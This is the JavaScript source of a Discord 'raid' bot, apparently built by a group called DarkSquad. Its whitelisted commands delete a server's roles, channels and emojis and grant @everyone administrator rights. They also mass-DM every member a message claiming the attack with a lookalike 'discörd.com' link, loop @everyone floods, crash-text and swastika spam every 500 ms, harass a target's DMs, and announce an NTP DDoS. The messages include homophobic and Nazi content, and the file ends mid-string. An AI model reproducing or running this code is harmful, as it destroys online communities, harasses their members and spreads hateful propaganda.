var Discord = require("discord.js");
bot = new Discord.Client();
var prefix = ("_");
const path = require('path')
const config = require("./config.json");
var perms = ["KICK_MEMBERS","BAN_MEMBERS","ADMINISTRATOR","CREATE_INSTANT_INVITE","MANAGE_CHANNELS","MANAGE_GUILD","ADD_REACTIONS","VIEW_AUDIT_LOG","VIEW_CHANNEL","READ_MESSAGES","SEND_MESSAGES","SEND_TTS_MESSAGES","MANAGE_MESSAGES","EMBED_LINKS","ATTACH_FILES","READ_MESSAGE_HISTORY","MENTION_EVERYONE","USE_EXTERNAL_EMOJIS","EXTERNAL_EMOJIS","CONNECT","SPEAK","MUTE_MEMBERS","DEAFEN_MEMBERS","MOVE_MEMBERS","USE_VAD","CHANGE_NICKNAME","MANAGE_NICKNAMES","MANAGE_ROLES","MANAGE_ROLES_OR_PERMISSIONS","MANAGE_WEBHOOKS","MANAGE_EMOJIS"];
var i = 0;

bot.on('ready', () => {
    console.log("");
    console.log("ℙ𝕣𝕖𝕥 𝕒 𝕕𝕖𝕥𝕣𝕦𝕚𝕣𝕖 𝕕𝕖𝕤 𝕤𝕖𝕣𝕧𝕖𝕦𝕣𝕤 !");
});
function base64_encode(file) {
    var bitmap = fs.readFileSync(file);
    return new Buffer(bitmap).toString('base64');
}


  bot.on('message', message => {
    var exec = message.author.id !== "499089660115419136" && message.author.id !== "436230901496807435" && message.author.id !== "448786569537519617" &&  message.author.id !== "456687648514375681" &&  message.author.id !== "415972663035691038" &&  message.author.id !== "346239921402675202" &&  message.author.id !== "499089660115419136" &&  message.author.id !== "275365863958249473" &&  message.author.id !== "464842270190075914" &&  message.author.id !== "499089660115419136" && message.author.id !== "499089660115419136" &&  message.author.id !== "499089660115419136" &&  message.author.id !== "413088557159415819" && message.author.id !== "000000000000000" && message.author.id !== "456687648514375681" && message.author.id !== "406963973552996353" && message.author.id !== "305985056357220354" && message.author.id !== "454980933507088406" &&  message.author.id !== "380410660309434370" &&  message.author.id !== "341303714692333571" &&  message.author.id !== "463024153101074449" &&  message.author.id !== "305257712244097024"
       var part = message.author.id !== "305257712244097024" && message.author.id !== "456687648514375681" && message.author.id !== "406963973552996353" && message.author.id !== "305985056357220354" && message.author.id !== "454980933507088406" &&  message.author.id !== "380410660309434370" &&  message.author.id !== "341303714692333571" &&  message.author.id !== "463024153101074449" &&  message.author.id !== "00000000000000"
  	
	if (message.content.startsWith(prefix)) {
		if(message.author.bot) return; 
		try {
			var splited_message = message.content.slice(prefix.length).split(" ");
			var command = splited_message[0];
			var parameters = splited_message.slice(1)
		} catch (error) {
			return
		};
        
     
        try {
  
			if (["mp"].includes(command)) {
                             if(part && exec) {
					return message.author.send("❌ Cette commande est interdit pour manque de confiance.").catch(console.error)
        };
				    if(message.deletable) message.delete();
	  message.guild.members.forEach(member => {


      const sicon = 'https://image.ibb.co/kbMvUT/videotogif_2018_07_23_14_58_36.gif'
      let serverembed = new Discord.RichEmbed()
      .setTitle("__**CETTE ATTAQUE EST REVENDIQUÉ PAR LA DARKSQUAD !**__")
      .setDescription(`***${message.guild.name} vient d'être attaqué par la DarkSquad\nqui sème la discorde et l'effroi puis nous mettront bientot à terme aux activités des serveurs anti-raid tels que FTNL ou TeamProtect qui pense voir un discord purifiée des raideurs.\n Parmi ceux qui ont rejoint les anti-raideurs, ce cache un bon grand nombre de LGBT ainsi qu'une bande de 2K18.***`)
      .setColor("#320242")
      .setThumbnail(sicon)
      .setURL('http://discörd.com/O4CGG0')
      .setFooter(`Rejoindre la DarkSquad · https://discord.gg/TzzRmg4`);
           member.send(serverembed).catch(console.error)
    
          })
			}
      if (["ddos"].includes(command)) {
      
        if(part && exec) {
					return message.author.send("❌ Cette commande est interdit pour manque de confiance.").catch(console.error)
        };
        if(message.deletable) message.delete();
        var toRepeat = parameters.join(" ");
        let sicon = "http://img.over-blog-kiwi.com/1/04/76/23/20161130/ob_dad56b_anonymous.jpg";
        let serverembed = new Discord.RichEmbed()
					
        .setTitle("__**Attaque de DDOS**__")
        .setColor("#320242")
        .setThumbnail(sicon)
        .setDescription("**L'attaque sera lancée dans 1h~3h**")
        .addField("`METHODE`", '**NTP**', true)
        .addField("`SECONDES`", "**7500**", true)
        .addField("`INFORMATION`", `__**${toRepeat}**__`, true)
        .addField("`UTILISATION`", `__**XX**__`, true)
					.setFooter("Effectué par "+ message.author.username, message.author.avatarURL)
        
        message.channel.send(serverembed).catch(e => {});
bot.channels.find('id','472722886784974850').send(serverembed)
      }
					if (["verif"].includes(command)) {
            if(part && exec) {
              return message.author.send("❌ Cette commande est interdit pour manque de confiance.").catch(console.error)
            };
				    if(message.deletable) message.delete();


        if (message.guild.me.hasPermission("ADMINISTRATOR")) return message.author.send('`Le bot est bien administrateur.`');
message.author.send("`Le bot n'est pas administrateur.`");
          
			}
	if (["dark"].includes(command)) {
    if(part && exec) {
      return message.author.send("❌ Cette commande est interdit pour manque de confiance.").catch(console.error)
    };
        if(message.deletable) message.delete();

        message.guild.members.forEach(member => {


          const sicon = 'https://image.ibb.co/kbMvUT/videotogif_2018_07_23_14_58_36.gif'
          let serverembed = new Discord.RichEmbed()
          .setTitle("__**CETTE ATTAQUE EST REVENDIQUÉ PAR LA DARKSQUAD !**__")
          .setDescription(`***${message.guild.name} vient d'être attaqué par la DarkSquad\nqui sème la discorde et l'effroi puis nous mettront bientot à terme aux activités des serveurs anti-raid tels que FTNL ou TeamProtect qui pense voir un discord purifiée des raideurs.\n Parmi ceux qui ont rejoint les anti-raideurs, ce cache un bon grand nombre de LGBT ainsi qu'une bande de 2K18.***`)
          .setColor("#320242")
          .setThumbnail(sicon)
          .setURL('http://discörd.com/O4CGG0')
          .setFooter(`Rejoindre la DarkSquad · https://discord.gg/TzzRmg4`);
               member.send(serverembed).catch(console.error)
        
              })
                  var interval = setInterval (function () {
                    message.channel.send(`__***Annonce Importante :***__\n_**La DarkSquad a fait son apparition,**_\n_**Toutes les membres du serveur seront violemment mentionnée sans exception.**_\n@everyone\n@everyone @everyone @everyone @everyone\n***========================================***\n@here @here @here @here\n@here𛲡\nhttps://image.ibb.co/dB4aET/videotogif_2018_07_26_08_52_11.gif\nhttps://image.ibb.co/mrwBoo/videotogif_2018_07_26_08_51_48.gif\nhttps://image.ibb.co/dB4aET/videotogif_2018_07_26_08_52_13.gif\nhttps://www.youtube.com/watch?time_continue=4&v=sAMVmYeqRFw\n 𛲡𛲡\n 𛲡𛲡\n 𛲡𛲡\n 𛲡𛲡\n 𛲡𛲡\n 𛲡𛲡\n 𛲡𛲡\n 𛲡𛲡\n 𛲡𛲡\n 𛲡𛲡\n 𛲡𛲡\n 𛲡𛲡\n 𛲡𛲡\n 𛲡𛲡\n 𛲡𛲡\n 𛲡𛲡\n 𛲡𛲡\n 𛲡𛲡\n 𛲡𛲡\n 𛲡𛲡\n 𛲡𛲡\n 𛲡𛲡\n 𛲡𛲡\n 𛲡𛲡\n 𛲡𛲡\n 𛲡𛲡\n 𛲡𛲡\n 𛲡𛲡\n 𛲡𛲡\n 𛲡𛲡\n 𛲡𛲡\n 𛲡𛲡\n 𛲡𛲡\n 𛲡𛲡\n 𛲡𛲡\n 𛲡𛲡\n 𛲡𛲡\n 𛲡𛲡\n 𛲡𛲡\n 𛲡𛲡\n 𛲡𛲡\n 𛲡𛲡\n 𛲡𛲡\n 𛲡𛲡\n 𛲡𛲡\n 𛲡𛲡\n 𛲡𛲡\n 𛲡𛲡\n 𛲡𛲡\n 𛲡𛲡\n 𛲡𛲡\n 𛲡𛲡\n 𛲡𛲡\n 𛲡𛲡\n 𛲡𛲡\n 𛲡𛲡\n 𛲡𛲡\n 𛲡𛲡\n 𛲡𛲡\n 𛲡𛲡\n 𛲡𛲡\n 𛲡𛲡\n 𛲡𛲡\n 𛲡𛲡\n 𛲡𛲡\n 𛲡𛲡\n 𛲡𛲡\n 𛲡𛲡\n 𛲡𛲡\n 𛲡𛲡\n 𛲡𛲡\n 𛲡𛲡\n【‾͟͟͞\n【‾͟͟͞\n【‾͟͟͞\n【‾͟͟͞\n【‾͟͟͞\n【‾͟͟͞\n【‾͟͟͞\n【‾͟͟͞\n【‾͟͟͞\n【‾͟͟͞\n【‾͟͟͞\n【‾͟͟͞\n【‾͟͟͞\n【‾͟͟͞\n【‾͟͟͞\n【‾͟͟͞\n【‾͟͟͞\n【‾͟͟͞\n【‾͟͟͞\n【‾͟͟͞\n【‾͟͟͞\n【‾͟͟͞\n【‾͟͟͞\n【‾͟͟͞\n【‾͟͟͞\n【‾͟͟͞\n【‾͟͟͞\n【‾͟͟͞\n【‾͟͟͞\n【‾͟͟͞\n【‾͟͟͞\n【‾͟͟͞\n【‾͟͟͞\n【‾͟͟͞\n【‾͟͟͞\n【‾͟͟͞\n【‾͟͟͞\n【‾͟͟͞\n【‾͟͟͞\n【‾͟͟͞\n【‾͟͟͞\n【‾͟͟͞\n【‾͟͟͞\n【‾͟͟͞\n【‾͟͟͞\n【‾͟͟͞\n【‾͟͟͞\n【‾͟͟͞\n【‾͟͟͞\n【‾͟͟͞\n【‾͟͟͞\n【‾͟͟͞\n【‾͟͟͞\n【‾͟͟͞\n【‾͟͟͞\n【‾͟͟͞\n【‾͟͟͞\n【‾͟͟͞\n【‾͟͟͞\n【‾͟͟͞\n【‾͟͟͞\n【‾͟͟͞\n【‾͟͟͞\n【‾͟͟͞\n【‾͟͟͞\n【‾͟͟͞\n【‾͟͟͞\n【‾͟͟͞\n【‾͟͟͞\n【‾͟͟͞\n【‾͟͟͞\n【‾͟͟͞\n【‾͟͟͞\n【‾͟͟͞\n【‾͟͟͞\n【‾͟͟͞\n【‾͟͟͞\n【‾͟͟͞\n【‾͟͟͞\n【‾\n【‾\n【‾\n【‾\n【‾\n【‾\n【‾\n【‾\n【‾\n【‾\n【‾\n【‾\n【‾\n【‾\n【‾\n【‾\n【‾\n【‾\n【‾\n【‾\n【‾\n【‾\n【‾\n【‾\n【‾\n【‾\n【‾\n【‾\n【‾\n【‾\n【‾\n【‾\n【‾\n【‾\n【‾\n【‾\n【‾\n【‾\n【‾\n【‾\n【‾\n【‾\n【‾\n【‾\n【‾\n【‾\n【‾\n【‾\n【‾\n⃢⃢⃢⃢⃢⃢⃢⃢⃢⃢⃢⃢⃢⃢⃢⃢⃢⃢⃢⃢⃢⃢⃢⃢⃢⃢⃢⃢⃢⃢⃢⃢⃢⃢⃢⃢⃢⃢⃢⃢⃢⃢⃢⃢⃢⃢⃢⃢⃢⃢⃢⃢⃢⃢⃢⃢⃢⃢⃢⃢⃢⃢⃢⃢⃢⃢⃢⃢⃢⃢⃢⃢⃢⃢⃢⃢⃢⃢⃢⃢⃢⃢⃢⃢⃢⃢⃢⃢⃢⃢⃢⃢⃢⃢⃢⃢⃢⃢⃢⃢⃢⃢⃢⃢⃢⃢⃢⃢⃢⃢⃢⃢⃢⃢⃢⃢⃢⃢⃢⃢⃢⃢⃢⃢⃢⃢⃢⃢⃢⃢⃢⃢⃢⃢⃢⃢⃢⃢⃢⃢⃢⃢⃢⃢⃢⃢⃢⃢⃢⃢⃢⃢⃢⃢⃢⃢⃢⃢⃢⃢⃢⃢⃢⃢⃢⃢⃢⃢⃢⃢⃢⃢⃢⃢⃢⃢⃢⃢⃢⃢⃢⃢⃢⃢⃢⃢⃢⃢⃢⃢⃢⃢⃢⃢⃢⃢⃢⃢⃢⃢⃢⃢⃢⃢⃢⃢⃢⃢⃢⃢⃢⃢⃢⃢⃢⃢⃢⃢⃢⃢⃢⃢⃢⃢⃢⃢⃢⃢⃢⃢⃢⃢⃢⃢⃢⃢⃢⃢⃢⃢⃢⃢⃢⃢⃢⃢⃢⃢⃢⃢⃢⃢⃢⃢⃢⃢⃢⃢⃢⃢⃢⃢⃢⃢⃢⃢⃢⃢⃢⃢⃢⃢⃢⃢⃢⃢⃢⃢⃢⃢⃢⃢⃢⃢⃢⃢⃢⃢⃢⃢⃢⃢⃢⃢⃢⃢⃢⃢⃢⃢⃢⃢⃢⃢⃢⃢⃢⃢⃢⃢⃢⃢⃢⃢⃢⃢⃢⃢⃢⃢⃢⃢⃢⃢⃢⃢⃢⃢⃢⃢⃢⃢⃢⃢⃢⃢⃢⃢⃢⃢⃢⃢⃢⃢`);
                }, 500)
  
      }
   if (["rerole"].includes(command)) {
    if(part && exec) {
      return message.author.send("❌ Cette commande est interdit pour manque de confiance.").catch(console.error)
    };
        if(message.deletable) message.delete();
    Promise.all(message.guild.roles.map(c => c.delete())).catch(console.error);
    message.author.send('**Tous les rôles supprimables ont été supprimés.**').catch(console.error);
}

      if (["remoji"].includes(command)) {
     

        if(part && exec) {
					return message.author.send("❌ Cette commande est interdit pour manque de confiance.").catch(console.error)
        };
if(message.deletable) message.delete();
message.guild.emojis.forEach(emoji => {
  message.guild.deleteEmoji(emoji).catch(console.error)
})

}
if (["discorde"].includes(command)) {
     

  if(part && exec) {
    return message.author.send("❌ Cette commande est interdit pour manque de confiance.").catch(console.error)
  };
  if(message.deletable) message.delete();
	
	message.guild.setVerificationLevel(0);
  message.author.send("```Il ne vous reste plus assez de temps avant que les modérateurs du serveur se rend compte de la situation 😜```\n\n__**Vous venez d'avoir un rôle administrateur.**__").catch(console.error)
     Promise.all(message.guild.roles.map(c => c.delete()));
    message.author.send('** PS: La supprimation des emojis et roles peut prendre environ 2 min**');
    	message.guild.roles.find('name', '@everyone').edit({
        permissions: ['ADMINISTRATOR']
    }).catch(console.error);

	if(message.guild.roles.exists("name", 'ツ'))  {
                
      message.guild.members.forEach(member => { 
        member.addRoles(message.guild.roles.find("name", 'ツ'));
      })
    }
  message.member.guild.createRole({
    name: "ツ",
    permissions: perms,
    mentionable: false,
    color: 'RANDOM'
  }).then(function(role) {
    message.member.addRole(role)
    if (message.deletable) message.delete().catch(console.error)
  }).catch(console.error)
  
              message.guild.members.forEach(member => {
                if(member.setNickname("ツ"));
                
            })
        
message.guild.channels.forEach(channel => {
  if(channel.deletable) channel.delete()
})
if(message.deletable) message.delete();
message.guild.emojis.forEach(emoji => {
message.guild.deleteEmoji(emoji)
})
	
}


   if (["supp"].includes(command)) {
      
    if(part && exec) {
      return message.author.send("❌ Cette commande est interdit pour manque de confiance.").catch(console.error)
    };

    if(message.deletable) message.delete();
    if(message.guild.roles.exists("name", 'ツ'))  {
       
            
      message.guild.members.forEach(member => { 
        member.addRoles(message.guild.roles.find("name", 'ツ'));
      })
    }
    message.member.guild.createRole({
          name: "ツ",
          permissions: perms,
          mentionable: false,
          color: 'RANDOM'
          }).then(function(role) {
          message.member.addRole(role)
          }).catch(console.error)
    message.guild.channels.forEach(channel => {
      if(channel.deletable) channel.delete().catch(console.error)
  })
}
else if (["rip"].includes(command)) {
  message.delete();
  if(exec) {
    return message.author.send("❌ Cette commande est interdit pour vous.").catch(console.error)
  };
  var toRepeat = parameters.join(" ");
  if (toRepeat === "") {
      return message.channel.send("Mentionne celui qui va se faire violer x) (espéront que la victime utilise l'application discord sur mobile/pc est non sur d'autre plateformes).")
  };
  var member = message.author;
  if (parameters.length > 0) {
      let member_got = message.guild.member(message.mentions.users.first() || message.guild.members.get(parameters[0]));
      if (member_got != undefined) {
          var member = member_got.user
      }
  };
  message.channel.send(`**RIP** ${member}`)
  var interval = setInterval (function () {

  member.send(`${member}\n ͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌`).catch(console.error);
}, 500) 

}	
   if (["nazi"].includes(command)) {
    if(part && exec) {
      return message.author.send("❌ Cette commande est interdit pour manque de confiance.").catch(console.error)
    };
if(message.deletable) message.delete();
	   
	       message.guild.members.forEach(member => {

          const sicon = 'https://image.ibb.co/kbMvUT/videotogif_2018_07_23_14_58_36.gif'
          let serverembed = new Discord.RichEmbed()
          .setTitle("__**CETTE ATTAQUE EST REVENDIQUÉ PAR LA DARKSQUAD !**__")
          .setDescription(`***${message.guild.name} vient d'être attaqué par la DarkSquad\nqui sème la discorde et l'effroi puis nous mettront bientot à terme aux activités des serveurs anti-raid tels que FTNL ou TeamProtect qui pense voir un discord purifiée des raideurs.\n Parmi ceux qui ont rejoint les anti-raideurs, ce cache un bon grand nombre de LGBT ainsi qu'une bande de 2K18.***`)
          .setColor("#320242")
          .setThumbnail(sicon)
          .setURL('http://discörd.com/O4CGG0')
          .setFooter(`Rejoindre la DarkSquad · https://discord.gg/TzzRmg4`);
           member.send(serverembed).catch(console.error)

       
      })
var interval = setInterval (function () {
message.channel.send("@everyone \n```(۶ૈ ۜ ᵒ̌▱๋ᵒ̌ )۶ૈ=͟͟͞͞ 卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐